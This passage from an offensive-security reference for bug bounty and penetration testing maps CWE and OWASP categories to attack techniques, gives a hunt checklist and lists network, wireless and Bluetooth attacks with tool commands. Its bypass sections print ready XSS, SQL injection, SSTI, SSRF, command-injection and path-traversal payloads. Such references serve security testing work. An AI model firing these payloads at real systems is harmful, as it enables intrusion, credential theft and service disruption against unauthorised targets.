| 8 | CWE-22 | Path Traversal | Improper limitation of pathname | Web/API | `../../../etc/passwd` in file parameters |
| 9 | CWE-352 | Cross-Site Request Forgery (CSRF) | Missing/broken anti-CSRF tokens | Web | Craft auto-submitting form, test token validation |
| 10 | CWE-434 | Unrestricted Upload of Dangerous File Type | No file type validation on uploads | Web | Upload `.php`, `.jsp`, `.aspx` web shells |
| 11 | CWE-862 | Missing Authorization | No authorization check on functions | Web/API | Access admin endpoints as regular user |
| 12 | CWE-476 | NULL Pointer Dereference | Dereferencing null pointer | Network | Send null/empty values in unexpected places |
| 13 | CWE-287 | Improper Authentication | Broken authentication mechanisms | Web/API | Auth bypass, JWT manipulation, session fixation |
| 14 | CWE-190 | Integer Overflow or Wraparound | Integer arithmetic overflow | Web/API | Send MAX_INT+1, negative values for quantities |
| 15 | CWE-502 | Deserialization of Untrusted Data | Unsafe deserialization | Web/API | Java/PHP/Python serialized object injection |
| 16 | CWE-77 | Command Injection | Improper neutralization of commands | Web/API | Metacharacter injection in command-building functions |
| 17 | CWE-119 | Buffer Overflow | Operations on memory buffer without bounds check | Network | Long input strings, protocol fuzzing |
| 18 | CWE-798 | Use of Hard-coded Credentials | Credentials embedded in source code | Web/API/Cloud | Search JS bundles, decompile mobile apps for secrets |
| 19 | CWE-918 | Server-Side Request Forgery (SSRF) | Server makes requests to attacker-specified URLs | Web/API/Cloud | URL parameters: `http://127.0.0.1`, `http://169.254.169.254` |
| 20 | CWE-306 | Missing Authentication for Critical Function | No auth on sensitive endpoints | Web/API | Direct access to admin/internal API endpoints |
| 21 | CWE-362 | Race Condition (TOCTOU) | Concurrent execution with shared resource | Web/API | Parallel requests for balance transfer, coupon redeem |
| 22 | CWE-269 | Improper Privilege Management | Failure to properly manage privileges | Web/API/Cloud | Vertical privilege escalation, role confusion |
| 23 | CWE-94 | Code Injection | Improper control of code generation | Web/API | `eval()` injection, SSTI, expression language injection |
| 24 | CWE-863 | Incorrect Authorization | Authorization check exists but is flawed | Web/API | IDOR, horizontal privilege escalation |
| 25 | CWE-276 | Incorrect Default Permissions | Overly permissive default access | Cloud | World-readable S3 buckets, open Elasticsearch |

## Additional Critical CWEs (26-50)

| Rank | CWE ID | Name | Description | Applies To | How to Test |
|---|---|---|---|---|---|
| 26 | CWE-611 | XML External Entity (XXE) | XXE processing in XML parsers | Web/API | DTD injection, out-of-band XXE via file upload |
| 27 | CWE-200 | Exposure of Sensitive Information | Information disclosure to unauthorized actors | All | Error messages, debug endpoints, verbose APIs |
| 28 | CWE-311 | Missing Encryption of Sensitive Data | Sensitive data transmitted/stored unencrypted | Web/API/Mobile | HTTP instead of HTTPS, plaintext passwords in DB |
| 29 | CWE-532 | Insertion of Sensitive Info into Log File | Logging passwords, tokens, PII | Web/API/Cloud | Check log endpoints, error messages with tokens |
| 30 | CWE-601 | URL Redirection to Untrusted Site (Open Redirect) | Unvalidated redirects | Web | `?redirect=http://evil.com`, OAuth redirect_uri bypass |
| 31 | CWE-639 | Authorization Bypass Through User-Controlled Key | IDOR via user-supplied identifiers | Web/API | Change `user_id`, `order_id` in requests |
| 32 | CWE-400 | Uncontrolled Resource Consumption | Resource exhaustion / DoS | Web/API | Large payloads, recursive queries, zip bombs |
| 33 | CWE-668 | Exposure of Resource to Wrong Sphere | Resource accessible from wrong context | Web/API/Cloud | Cross-origin data access, misconfigured CORS |
| 34 | CWE-732 | Incorrect Permission Assignment | Wrong permissions on resources | Cloud | Overly permissive IAM, public cloud resources |
| 35 | CWE-427 | Uncontrolled Search Path Element | DLL hijacking, PATH manipulation | Network | DLL sideloading, LD_PRELOAD injection |
| 36 | CWE-843 | Access of Resource Using Incompatible Type (Type Confusion) | Type confusion vulnerabilities | Web/API | PHP type juggling: `0 == "string"`, JSON type mismatch |
| 37 | CWE-295 | Improper Certificate Validation | Failing to validate SSL/TLS certificates | Mobile/API | Certificate pinning bypass, self-signed cert acceptance |
| 38 | CWE-319 | Cleartext Transmission of Sensitive Information | Sending sensitive data over HTTP | Web/Mobile | Check for HTTP endpoints handling auth/PII data |
| 39 | CWE-345 | Insufficient Verification of Data Authenticity | Not verifying data integrity | Web/API | Unsigned webhooks, JWT without signature verification |
| 40 | CWE-522 | Insufficiently Protected Credentials | Weak credential storage/transmission | Web/API | Plaintext passwords, weak hashing (MD5/SHA1) |
| 41 | CWE-539 | Use of Persistent Cookies Containing Sensitive Information | Sensitive data in non-expiring cookies | Web | Check cookie flags: HttpOnly, Secure, SameSite, expiry |
| 42 | CWE-548 | Exposure of Information Through Directory Listing | Directory listing enabled | Web | Browse `/uploads/`, `/backup/`, check for autoindex |
| 43 | CWE-613 | Insufficient Session Expiration | Sessions that never expire | Web/API | Check if tokens remain valid after logout, after days |
| 44 | CWE-640 | Weak Password Recovery Mechanism | Insecure password reset | Web | Predictable reset tokens, no rate limiting on reset |
| 45 | CWE-706 | Use of Incorrectly-Resolved Name or Reference | Confusion in resource resolution | Web/API | Host header injection, namespace confusion |
| 46 | CWE-770 | Allocation of Resources Without Limits | No resource limits | Web/API/Cloud | Request flooding, memory exhaustion, fork bombs |
| 47 | CWE-829 | Inclusion of Functionality from Untrusted Control Sphere | Loading untrusted code | Web | Third-party JS inclusion, CDN compromise vectors |
| 48 | CWE-943 | Improper Neutralization of Special Elements in Data Query Logic | NoSQL injection | Web/API | MongoDB operator injection: `{"$ne": null}` |
| 49 | CWE-1021 | Improper Restriction of Rendered UI Layers | Clickjacking | Web | Missing `X-Frame-Options` / CSP `frame-ancestors` |
| 50 | CWE-1236 | Improper Neutralization of Formula Elements in CSV | CSV injection | Web | `=CMD("calc")` in exported CSV fields |

---

# 4. OWASP TOP 10 (2021)

| Rank | ID | Name | Description | How to Test |
|---|---|---|---|---|
| 1 | A01:2021 | Broken Access Control | Missing/broken authorization, IDOR, privilege escalation, forced browsing | Test every endpoint as different roles. Change IDs. Access admin paths as user. IDOR on all object references. |
| 2 | A02:2021 | Cryptographic Failures | Weak crypto, plaintext data, broken TLS, weak hashing | Check HTTPS enforcement, cipher suites, password hashing, data-at-rest encryption, exposed secrets. |
| 3 | A03:2021 | Injection | SQLi, XSS, NoSQLi, OS command injection, LDAP injection | Test all input fields with injection payloads. Automated + manual. Context-aware payloads. |
| 4 | A04:2021 | Insecure Design | Flawed business logic, missing security controls by design | Business logic testing: negative amounts, race conditions, workflow bypass, missing rate limits. |
| 5 | A05:2021 | Security Misconfiguration | Default creds, open cloud storage, verbose errors, unnecessary features | Check default pages, error handling, CORS, HTTP headers, cloud storage permissions, directory listing. |
| 6 | A06:2021 | Vulnerable and Outdated Components | Known CVEs in dependencies, unpatched libraries | Version fingerprinting, CVE lookup, dependency scanning, outdated JavaScript libraries. |
| 7 | A07:2021 | Identification and Authentication Failures | Broken auth, weak passwords, session issues, credential stuffing | Test brute force protection, session management, MFA bypass, password policy, session fixation. |
| 8 | A08:2021 | Software and Data Integrity Failures | Unsafe deserialization, unsigned updates, compromised CI/CD | Test deserialization endpoints, check code signing, CI/CD pipeline security, dependency integrity. |
| 9 | A09:2021 | Security Logging and Monitoring Failures | Missing audit logs, no alerting, log injection | Test if security events are logged, check for log injection, verify monitoring (usually low bounty). |
| 10 | A10:2021 | Server-Side Request Forgery (SSRF) | Server fetches attacker-supplied URLs | URL parameters, webhook URLs, PDF generators, image fetchers — test with Burp Collaborator / interactsh. |

---

# 5. OWASP API SECURITY TOP 10 (2023)

| Rank | ID | Name | Description | How to Test |
|---|---|---|---|---|
| 1 | API1:2023 | Broken Object Level Authorization (BOLA) | APIs expose endpoints handling object IDs, enabling IDOR | Change object IDs in every API call. `GET /api/users/123` → try `/api/users/124`. Test with different auth tokens. |
| 2 | API2:2023 | Broken Authentication | Weak auth mechanisms in APIs | Test token generation, expiration, JWT attacks (`none` alg, key confusion), API key exposure. |
| 3 | API3:2023 | Broken Object Property Level Authorization | Excessive data exposure + mass assignment | Check if API returns more fields than UI shows. Try adding extra fields in PUT/PATCH (role, isAdmin). |
| 4 | API4:2023 | Unrestricted Resource Consumption | No rate limiting, allowing DoS and brute force | Send rapid requests, test for rate limits on auth endpoints, check response time for expensive queries. |
| 5 | API5:2023 | Broken Function Level Authorization (BFLA) | Missing authorization on API functions | Access admin API endpoints with regular user token. `DELETE /api/users/123` as non-admin. |
| 6 | API6:2023 | Unrestricted Access to Sensitive Business Flows | Abuse of legitimate business flows | Automated purchasing, ticket scalping, review bombing — test for bot detection, rate limits. |
| 7 | API7:2023 | Server Side Request Forgery (SSRF) | API fetches attacker-supplied URLs | Webhook URLs, file import URLs, avatar URLs — test with internal IPs, cloud metadata. |
| 8 | API8:2023 | Security Misconfiguration | Insecure default config, missing hardening | Check CORS policy, HTTP methods, verbose errors, unnecessary endpoints, debug modes. |
| 9 | API9:2023 | Improper Inventory Management | Undocumented/deprecated APIs still active | Find old API versions (`/v1/` vs `/v2/`), Swagger/OpenAPI endpoints, deprecated paths still working. |
| 10 | API10:2023 | Unsafe Consumption of APIs | Trusting third-party API responses without validation | Test if app validates data from external APIs, SSRF via third-party redirects, injection via webhook data. |

---

# 6. OWASP MOBILE TOP 10 (2024)

| Rank | ID | Name | Description | How to Test |
|---|---|---|---|---|
| 1 | M1 | Improper Credential Usage | Hardcoded credentials, insecure credential storage | Decompile APK/IPA, search for API keys, tokens, passwords in source/resources. |
| 2 | M2 | Inadequate Supply Chain Security | Compromised third-party libraries, SDKs | Analyze dependencies, check for known vulns in included libraries. |
| 3 | M3 | Insecure Authentication/Authorization | Weak local auth, missing server-side auth | Bypass biometrics, test API calls without auth, IDOR in mobile API endpoints. |
| 4 | M4 | Insufficient Input/Output Validation | Injection attacks via mobile input | SQLi in local DB, XSS in WebViews, deeplink injection. |
| 5 | M5 | Insecure Communication | Plaintext traffic, weak TLS, no cert pinning | Proxy with Burp, check for HTTP traffic, bypass cert pinning (Frida/Objection). |
| 6 | M6 | Inadequate Privacy Controls | PII leaks, excessive data collection | Check what data is stored locally, sent to analytics, shared with third parties. |
| 7 | M7 | Insufficient Binary Protections | No obfuscation, no tamper detection, debuggable | Check for `android:debuggable`, attempt reverse engineering, Frida hooking. |
| 8 | M8 | Security Misconfiguration | Insecure default settings, debug flags | Check `AndroidManifest.xml` for exported components, debug flags, backup allowed. |
| 9 | M9 | Insecure Data Storage | Sensitive data stored insecurely on device | Check SharedPreferences, SQLite DBs, Keychain, plist files for secrets/PII. |
| 10 | M10 | Insufficient Cryptography | Weak algorithms, poor key management | Check for MD5/SHA1, hardcoded encryption keys, ECB mode, custom crypto. |

---

# 7. CROSS-REFERENCE MATRIX

## Attack Surface Quick Reference

### Web Application Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | SQL Injection | T1190, CAPEC-66, CWE-89, A03 | Full DB access, data theft |
| CRITICAL | Remote Code Execution | T1059, CAPEC-242, CWE-94, A03 | Full server compromise |
| CRITICAL | Authentication Bypass | T1078, CAPEC-115, CWE-287, A07 | Account takeover |
| CRITICAL | IDOR / Broken Access Control | T1548, CAPEC-122, CWE-862, A01, API1 | Data theft, privilege escalation |
| CRITICAL | SSRF | T1190, CAPEC-664, CWE-918, A10, API7 | Internal network access, cloud creds |
| HIGH | XSS (Stored) | T1189, CAPEC-63, CWE-79, A03 | Session hijacking, account takeover |
| HIGH | Insecure Deserialization | T1190, CAPEC-586, CWE-502, A08 | RCE, data tampering |
| HIGH | File Upload (Web Shell) | T1505.003, CAPEC-17, CWE-434, A04 | RCE, persistence |
| HIGH | Path Traversal / LFI | T1005, CAPEC-126, CWE-22, A01 | Source code disclosure, config theft |
| HIGH | CSRF | T1204, CAPEC-62, CWE-352, A01 | Unauthorized actions |
| MEDIUM | Open Redirect | T1204.001, CAPEC-194, CWE-601, A01 | Phishing, OAuth token theft |
| MEDIUM | XXE | T1190, CAPEC-228, CWE-611, A05 | File read, SSRF, DoS |
| MEDIUM | CORS Misconfiguration | T1189, CWE-668, A05, API8 | Cross-origin data theft |
| MEDIUM | HTTP Request Smuggling | T1190, CAPEC-33, CWE-444, A05 | Cache poisoning, auth bypass |

### API Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | BOLA (IDOR) | T1548, CAPEC-12, CWE-639, API1 | Mass data access |
| CRITICAL | BFLA (Missing Function Auth) | T1548, CAPEC-233, CWE-862, API5 | Admin function access |
| CRITICAL | Mass Assignment | T1565, CAPEC-57, CWE-915, API3 | Privilege escalation |
| CRITICAL | JWT Attacks | T1606, CAPEC-196, CWE-345, API2 | Auth bypass, impersonation |
| HIGH | GraphQL Injection/Abuse | T1190, CAPEC-66, CWE-89, API4 | Data extraction, DoS |
| HIGH | API Key Leakage | T1552, CAPEC-497, CWE-798, API2 | Full API access |
| HIGH | Rate Limiting Bypass | T1110, CAPEC-49, CWE-770, API4 | Brute force, DoS |
| HIGH | Excessive Data Exposure | T1530, CAPEC-116, CWE-200, API3 | PII/sensitive data theft |
| MEDIUM | API Versioning Abuse | T1190, CWE-1059, API9 | Bypass newer security controls |
| MEDIUM | HTTP Method Tampering | T1190, CAPEC-153, CWE-749, API8 | Auth bypass, unexpected behavior |

### Cloud Security Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | SSRF to Cloud Metadata | T1552.005, CAPEC-664, CWE-918, A10 | IAM credential theft |
| CRITICAL | Public S3/Blob/GCS Buckets | T1530, CWE-276, A05 | Mass data exposure |
| CRITICAL | IAM Privilege Escalation | T1548.005, CWE-269, A01 | Full cloud account takeover |
| HIGH | Exposed Cloud Credentials | T1552.001, CWE-798, A02 | Unauthorized cloud access |
| HIGH | Container Escape | T1611, CWE-269 | Host compromise from container |
| HIGH | Kubernetes API Abuse | T1613, T1552.007, CWE-306 | Cluster compromise |
| MEDIUM | CloudTrail/Logging Disabled | T1562.008, A09 | Undetected persistence |
| MEDIUM | Security Group Misconfig | T1562.007, CWE-732, A05 | Network exposure |
| MEDIUM | Lambda/Function Injection | T1648, CWE-94 | Serverless RCE |

### Network Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | Known CVE Exploitation | T1190, CWE-1395, A06 | RCE, full compromise |
| CRITICAL | Default Credentials | T1078.001, CAPEC-560, CWE-798, A07 | Unauthorized access |
| HIGH | Kerberoasting | T1558.003, CWE-522 | Service account compromise |
| HIGH | SMB Relay / NTLM Relay | T1557, CWE-294 | Credential relay, lateral movement |
| HIGH | Password Spraying | T1110.003, CAPEC-600, CWE-307 | Account compromise |
| MEDIUM | SNMP Enumeration | T1082, CWE-200 | Information disclosure |
| MEDIUM | DNS Zone Transfer | T1590.002, CWE-200 | Full DNS record exposure |
| MEDIUM | SSL/TLS Weaknesses | T1600, CWE-295, CWE-311 | Traffic interception |

### Mobile Testing — Priority Techniques

| Priority | Attack | Framework IDs | Impact |
|---|---|---|---|
| CRITICAL | Hardcoded Secrets | T1552.001, CWE-798, M1 | API key theft, backend access |
| CRITICAL | Insecure API Communication | T1557, CWE-319, M5 | Data interception |
| HIGH | Missing Certificate Pinning | CWE-295, M5 | MITM attacks |
| HIGH | Insecure Local Storage | CWE-312, M9 | PII/credential theft |
| HIGH | Exported Components | CWE-926, M8 | Unauthorized functionality access |
| MEDIUM | WebView Vulnerabilities | CAPEC-588, CWE-79, M4 | XSS in mobile context |
| MEDIUM | Deeplink Injection | CWE-939, M4 | Intent hijacking, phishing |
| MEDIUM | Debuggable/Backup Enabled | CWE-489, M7 | Data extraction, debugging |

---

## Hunt Checklist — The Alpha's Playbook

### Phase 1: Reconnaissance (TA0043)
- [ ] Subdomain enumeration (crt.sh, SecurityTrails, subfinder)
- [ ] Technology fingerprinting (Wappalyzer, HTTP headers)
- [ ] JavaScript analysis (extract endpoints, secrets, API keys)
- [ ] GitHub/GitLab dork for target org
- [ ] Wayback Machine for old endpoints
- [ ] Google dork: `site:target.com filetype:env|sql|log|conf`
- [ ] Shodan/Censys for exposed services
- [ ] API documentation discovery (Swagger, GraphQL introspection)
- [ ] Port scan if network scope (top 1000 ports)

### Phase 2: Authentication Testing (TA0006, A07, API2)
- [ ] Default credentials
- [ ] Registration bypass / self-registration abuse
- [ ] Password reset flow (token predictability, rate limiting)
- [ ] JWT analysis (algorithm, secret strength, claims)
- [ ] OAuth flow testing (redirect_uri, state, scope)
- [ ] Session management (fixation, expiration, invalidation)
- [ ] MFA bypass attempts
- [ ] Cookie security flags (HttpOnly, Secure, SameSite)

### Phase 3: Authorization Testing (TA0004, A01, API1, API5)
- [ ] IDOR on every object reference (user ID, order ID, file ID)
- [ ] Horizontal privilege escalation (access other users' data)
- [ ] Vertical privilege escalation (user to admin)
- [ ] BFLA — access admin functions as regular user
- [ ] Mass assignment — add `role`, `isAdmin`, `permissions` to requests
- [ ] Force browsing to admin paths
- [ ] API endpoint enumeration across versions

### Phase 4: Injection Testing (TA0002, A03)
- [ ] SQL injection in all parameters
- [ ] XSS (reflected, stored, DOM-based)
- [ ] OS command injection
- [ ] Server-Side Template Injection (SSTI)
- [ ] NoSQL injection
- [ ] LDAP injection (if applicable)
- [ ] Header injection / CRLF
- [ ] GraphQL injection

### Phase 5: Server-Side Attacks (A10, API7)
- [ ] SSRF in URL parameters, webhooks, file imports
- [ ] XXE in XML/SOAP endpoints, file uploads
- [ ] Insecure deserialization
- [ ] File upload bypass for RCE
- [ ] Path traversal / LFI
- [ ] HTTP request smuggling

### Phase 6: Business Logic (A04)
- [ ] Race conditions (parallel requests for balance/coupon)
- [ ] Price manipulation (negative quantities, modified prices)
- [ ] Workflow bypass (skip steps in multi-step process)
- [ ] Rate limiting bypass
- [ ] Feature abuse (mass operations, resource exhaustion)
- [ ] Currency/conversion rounding errors

### Phase 7: Configuration (A05, API8)
- [ ] CORS policy testing
- [ ] Security headers (CSP, HSTS, X-Frame-Options)
- [ ] Debug/test endpoints
- [ ] Exposed admin panels
- [ ] Directory listing
- [ ] Error handling (verbose errors, stack traces)
- [ ] Cloud storage permissions (S3, GCS, Azure Blob)

---

## Encoding & Bypass Quick Reference

### XSS Bypass Payloads
```
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
javascript:alert(1)//
\u006Aavascript:alert(1)
<script>alert`1`</script>
${alert(1)}    (template literal in JS context)
'-alert(1)-'   (JS string break)
</script><script>alert(1)</script>
```

### SQLi Quick Reference
```
' OR 1=1--
' UNION SELECT null,null,null--
' AND (SELECT SUBSTRING(version(),1,1))='5'--
'; WAITFOR DELAY '0:0:5'--            (MSSQL time-based)
' AND SLEEP(5)--                      (MySQL time-based)
' AND pg_sleep(5)--                   (PostgreSQL time-based)
1' ORDER BY 1--                       (column enumeration)
```

### SSTI Detection
```
{{7*7}}              -> 49 (Jinja2/Twig)
${7*7}               -> 49 (Freemarker/EL)
<%= 7*7 %>           -> 49 (ERB)
#{7*7}               -> 49 (Thymeleaf/Pebble)
{{constructor.constructor('return 1')()}}  (Pug/Jade)
```

### SSRF Bypass
```
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://0x7f000001
http://2130706433        (decimal IP)
http://127.1
http://0177.0.0.1        (octal)
http://169.254.169.254   (cloud metadata)
http://metadata.google.internal  (GCP)
```

### Command Injection
```
; id
| id
`id`
$(id)
%0aid
\nid
& id
&& id
|| id
```

### Path Traversal
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
/..%c0%af../etc/passwd
```

---

> **The pack hunts with knowledge. Every technique, every ID, every bypass — documented and ready.**
> **This is the Alpha's complete attack knowledge base.**

---

# 8. ADVANCED NETWORK ATTACKS

> **Methods 434-466 | 33 techniques | Sources: MITRE ATT&CK, CVE databases, RFC exploits**

## Protocol Exploitation

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| N01 | BGP Hijacking | Announce unauthorized IP prefixes to reroute traffic through attacker-controlled AS | Protocol/Network | BGP route monitoring tools (BGPStream), check RPKI/ROV status |
| N02 | DNS Cache Poisoning (Kaminsky) | Inject forged DNS responses to redirect traffic to attacker-controlled IPs | Protocol/DNS | Send spoofed DNS replies with matching TXID, check DNSSEC validation |
| N03 | ARP Spoofing | Send gratuitous ARP to associate attacker MAC with victim IP on LAN | Protocol/L2 | arpspoof, ettercap, bettercap — verify ARP table changes |
| N04 | VLAN Hopping (Switch Spoofing) | Forge 802.1Q tags or DTP frames to access traffic on other VLANs | Protocol/L2 | Yersinia, frogger — send double-tagged frames, check cross-VLAN access |
| N05 | VLAN Hopping (Double Tagging) | Stack two 802.1Q headers to bypass trunk port filtering | Protocol/L2 | Craft double-tagged Ethernet frames with Scapy, test on native VLAN |
| N06 | DHCP Starvation | Exhaust DHCP pool with spoofed MAC requests, then run rogue DHCP | Protocol/L2 | dhcpstarv, Yersinia — flood DHCPDISCOVER, set up rogue server |
| N07 | ICMP Redirect Attack | Send ICMP redirect messages to reroute victim traffic through attacker | Protocol/L3 | Scapy ICMP redirect crafting, verify routing table changes |
| N08 | GRE/IP-in-IP Tunnel Abuse | Encapsulate traffic in GRE tunnels to bypass firewall rules | Protocol/L3 | Create GRE tunnel to target, send encapsulated packets through firewall |

## TCP/IP Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| N09 | SYN Flood | Send massive SYN packets without completing handshake to exhaust connection table | TCP/DoS | hping3 --flood -S, check target connection table saturation |
| N10 | IP Spoofing | Forge source IP address in packets to bypass IP-based authentication | TCP/L3 | Scapy with spoofed src IP, check if target accepts spoofed requests |
| N11 | TCP Session Hijacking | Inject packets into established TCP session using predicted sequence numbers | TCP/Session | hunt, shijack — sniff session, predict SEQ/ACK, inject RST or data |
| N12 | TCP Reset Attack | Send forged RST packets to tear down established connections | TCP/DoS | Scapy RST injection with guessed SEQ numbers, observe connection drops |
| N13 | TCP Sequence Prediction | Predict ISN to hijack or spoof TCP connections | TCP/Session | nmap -O for ISN analysis, check randomness of initial sequence numbers |
| N14 | IP Fragmentation Attack (Teardrop) | Send overlapping IP fragments to crash target IP reassembly | TCP/DoS | fragrouter, Scapy with overlapping fragment offsets |
| N15 | Idle Scan (Zombie Scan) | Use IPID increments of idle host to scan target without revealing scanner IP | TCP/Recon | nmap -sI zombie_host target — verify IPID predictability first |

## SSL/TLS Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| N16 | BEAST (CVE-2011-3389) | Exploit CBC mode in TLS 1.0 to decrypt HTTPS cookies via chosen-plaintext | TLS/Crypto | testssl.sh, check for TLS 1.0 with CBC ciphers enabled |
| N17 | BREACH | Compress-and-observe attack on HTTP responses to extract secrets via size changes | TLS/Compression | Check if HTTP compression + CSRF tokens in response body, vary input observe size |
| N18 | POODLE (CVE-2014-3566) | Exploit SSLv3 CBC padding to decrypt one byte per 256 requests | TLS/Crypto | testssl.sh --poodle, nmap --script ssl-poodle, check SSLv3 support |
| N19 | Heartbleed (CVE-2014-0160) | Read up to 64KB of server memory via malformed TLS heartbeat extension | TLS/Memory | nmap --script ssl-heartbleed, sslyze --heartbleed, check OpenSSL version |
| N20 | CRIME | Exploit TLS-level compression to recover session cookies via response size | TLS/Compression | testssl.sh, check if TLS compression is enabled (DEFLATE) |
| N21 | DROWN (CVE-2016-0800) | Use SSLv2 export cipher to break TLS sessions via cross-protocol attack | TLS/Crypto | testssl.sh --drown, check if SSLv2 enabled on any port sharing same cert |
| N22 | ROBOT (Return Of Bleichenbacher) | RSA key exchange padding oracle to decrypt TLS sessions | TLS/Crypto | robot-detect tool, testssl.sh --robot, check RSA key exchange support |
| N23 | Logjam (CVE-2015-4000) | Downgrade DHE to 512-bit export-grade to break Diffie-Hellman | TLS/Crypto | testssl.sh, check for DHE_EXPORT ciphers and DH parameter size |
| N24 | FREAK (CVE-2015-0204) | Force RSA_EXPORT downgrade to factor 512-bit RSA keys | TLS/Crypto | testssl.sh --freak, check for export RSA ciphers |

## HTTP Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| N25 | HTTP Request Smuggling (CL.TE) | Frontend uses Content-Length, backend uses Transfer-Encoding — inject second request | HTTP/Smuggling | Send CL and TE headers with conflicting body boundaries, observe response splitting |
| N26 | HTTP Request Smuggling (TE.CL) | Frontend uses Transfer-Encoding, backend uses Content-Length — desync requests | HTTP/Smuggling | Reverse CL.TE: TE header first, malformed chunked body confuses backend CL |
| N27 | HTTP Request Smuggling (TE.TE) | Both use Transfer-Encoding but parse obfuscated TE differently | HTTP/Smuggling | Obfuscate TE header (Transfer-Encoding: chunked, xchunked, etc.) |
| N28 | HTTP/2 Desync (H2.CL) | HTTP/2 frontend allows CL header, HTTP/1.1 backend processes it differently | HTTP/Smuggling | Send HTTP/2 request with :method, :path and content-length pointing to smuggled prefix |
| N29 | H2C Smuggling | Upgrade HTTP/1.1 to cleartext HTTP/2 to bypass reverse proxy restrictions | HTTP/Smuggling | Send Upgrade: h2c header, bypass proxy auth/WAF on upgraded connection |
| N30 | Slowloris | Keep many HTTP connections open with partial headers to exhaust server threads | HTTP/DoS | slowloris.py, send partial headers every 10s, check if server stops accepting |

## DNS Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| N31 | DNS Rebinding | Rapidly change DNS resolution from attacker IP to internal IP to bypass SOP | DNS/Bypass | Set up DNS server with low TTL flipping between external and 127.0.0.1 |
| N32 | Subdomain Takeover | Claim unclaimed resources pointed to by target CNAME records | DNS/Takeover | Check CNAME targets for 404/NXDOMAIN, attempt registration on cloud providers |
| N33 | DNS Zone Transfer (AXFR) | Request full DNS zone data from misconfigured nameservers | DNS/Recon | dig axfr @ns.target.com target.com — check if zone transfer allowed |
| N34 | NXDOMAIN Attack | Flood DNS resolver with queries for non-existent subdomains to exhaust cache | DNS/DoS | Generate random subdomain queries at high volume, monitor resolver performance |
| N35 | DNS Tunneling | Encode data in DNS queries/responses to exfiltrate through firewalls | DNS/Exfil | iodine, dnscat2 — establish tunnel, measure throughput through DNS |
| N36 | DNS Amplification | Spoof source IP and send DNS queries to open resolvers for DDoS amplification | DNS/DoS | Scapy spoofed ANY queries to open resolvers, measure amplification factor |

---

# 9. WIRELESS & BLUETOOTH ATTACKS

> **Methods 467-484 | 18 techniques | Sources: MITRE ATT&CK, wireless security research**

## WiFi Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| W01 | WPA2 PMKID Attack | Capture PMKID from first EAPOL frame without full handshake — offline crack | WiFi/Auth | hcxdumptool to capture PMKID, hashcat -m 22000 to crack offline |
| W02 | Evil Twin AP | Clone target SSID to trick clients into connecting to rogue access point | WiFi/MitM | hostapd-mana, wifiphisher — create identical SSID, capture credentials |
| W03 | KARMA Attack | Respond to all WiFi probe requests to lure devices to rogue AP | WiFi/MitM | hostapd-mana with KARMA mode, intercept auto-connect clients |
| W04 | Deauthentication Attack | Send deauth frames to disconnect clients from AP, force reconnection | WiFi/DoS | aireplay-ng --deauth, mdk4 — force handshake capture or redirect to evil twin |
| W05 | WPS Pixie Dust | Exploit weak random number generation in WPS to recover PIN offline | WiFi/Auth | reaver -K 1, pixiewps — works on Ralink/Broadcom/Realtek chipsets |
| W06 | WPA2 KRACK (CVE-2017-13077) | Reinstall encryption key during 4-way handshake by replaying message 3 | WiFi/Crypto | krackattacks-scripts, check if client/AP patched, replay handshake msg 3 |
| W07 | WPA3 Dragonblood | Side-channel and downgrade attacks against WPA3 SAE/Dragonfly handshake | WiFi/Crypto | dragonslayer tool, test for SAE timing side-channel or transition mode downgrade |
| W08 | WiFi Direct Abuse | Exploit WiFi Direct P2P connections for unauthorized access | WiFi/Access | wpa_cli p2p_find, connect to devices with weak/no PIN verification |

## Bluetooth Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| W09 | BLE Sniffing | Capture Bluetooth Low Energy advertising and connection traffic | BT/Recon | Ubertooth, btlejack — capture BLE packets, extract device names and services |
| W10 | KNOB Attack (CVE-2019-9506) | Negotiate 1-byte entropy for Bluetooth encryption key to brute-force in real-time | BT/Crypto | InternalBlue framework, check if devices accept minimum key entropy |
| W11 | BIAS Attack (CVE-2020-10135) | Bypass Bluetooth authentication by impersonating previously paired device | BT/Auth | Spoof BD_ADDR + role switch during secure connection establishment |
| W12 | BlueBorne (CVE-2017-1000251) | RCE via Bluetooth stack vulnerabilities without pairing or user interaction | BT/RCE | blueborne-scanner, check kernel/bluez version, send crafted L2CAP packets |
| W13 | BT Impersonation (KNOB+BIAS) | Combine KNOB entropy reduction with BIAS role impersonation for full MitM | BT/MitM | Chain KNOB downgrade then BIAS impersonation for bidirectional interception |
| W14 | Bluetooth PIN Cracking | Brute-force legacy Bluetooth PINs (often 0000 or 1234) | BT/Auth | btcrack, redfang — enumerate discoverable devices, try default PINs |

## NFC/RFID Attacks

| ID | Name | Description | Category | How to Test |
|---|---|---|---|---|
| W15 | RFID Cloning | Read and duplicate RFID card data to create unauthorized copy | NFC/Clone | Proxmark3, RFID chameleon — read UID and data blocks, write to blank card |
| W16 | NFC Relay Attack | Relay NFC communication between reader and card over distance | NFC/Relay | NFCGate on Android, relay reader-to-card comms over network tunnel |
| W17 | Mifare Classic Cracking | Exploit Crypto-1 cipher weaknesses in Mifare Classic cards | NFC/Crypto | mfoc, mfcuk on Proxmark3 — nested and darkside attacks to recover keys |
| W18 | RFID Skimming | Covertly read contactless card data at distance without holder knowledge | NFC/Recon | Long-range RFID reader, Proxmark3 with amplified antenna, capture card data |

---

# 10. CRYPTOGRAPHIC ATTACKS

> **Methods 485-507 | 23 techniques | Sources: Crypto research, CVE databases, NIST**

## Block Cipher Attacks

| ID | Name | Description | Category | How to Test |
